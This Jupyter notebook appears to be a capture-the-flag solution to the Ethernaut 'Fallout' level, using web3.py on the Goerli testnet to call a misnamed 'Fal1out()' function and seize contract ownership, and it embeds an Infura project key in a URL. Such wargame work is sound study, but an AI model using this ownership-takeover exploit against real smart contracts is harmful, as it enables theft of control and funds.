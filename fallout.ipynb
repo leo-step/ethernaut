{
 "cells": [
  {
   "attachments": {},
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "---\n",
    "title: (02) Fallout\n",
    "description: https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7\n",
    "show-code: True\n",
    "---"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](https://ethernaut.openzeppelin.com/imgs/BigLevel2.svg)\n",
    "# (02) Fallout\n",
    "## https://ethernaut.openzeppelin.com/level/0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### If you look closely, this contract doesn't have an actual constructor. Fallout() is just a regular function that we can call to set ourselves as the owner."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from web3 import Web3\n",
    "from dotenv import load_dotenv\n",
    "from IPython.display import display, HTML\n",
    "import os\n",
    "import json\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "provider_url = 'https://goerli.infura.io/v3/69194ec6319d4463b70ef7215e7ee7a7'\n",
    "web3 = Web3(Web3.HTTPProvider(provider_url))\n",
    "account = '0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55'\n",
    "private_key = os.getenv('PRIVATE_KEY')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('abi/fallout_abi.json', 'r') as f:\n",
    "\tabi = json.load(f)\n",
    "\n",
    "contract_address = '0xbb4Abb4B05af6874C3A58cd6a5aEcEe5379BD854'\n",
    "\n",
    "contract = web3.eth.contract(address=contract_address, abi=abi)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<a href=\"https://goerli.etherscan.io/tx/0x9cd1c8b7684502f3d20c5fd9bfb777c33cea21e3b67d76da4bd36af305ed19ab\">0x9cd1c8b7684502f3d20c5fd9bfb777c33cea21e3b67d76da4bd36af305ed19ab</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "tx = {\n",
    "    'nonce': web3.eth.getTransactionCount(account),\n",
    "    'gas': 2000000,\n",
    "    'gasPrice': web3.toWei('50', 'gwei'),\n",
    "}\n",
    "\n",
    "tx = contract.functions.Fal1out().build_transaction(tx)\n",
    "\n",
    "signed_tx = web3.eth.account.sign_transaction(tx, private_key)\n",
    "\n",
    "tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)\n",
    "\n",
    "display(HTML(f'<a href=\"https://goerli.etherscan.io/tx/{web3.toHex(tx_hash)}\">{web3.toHex(tx_hash)}</a>'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contract.functions.owner().call()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
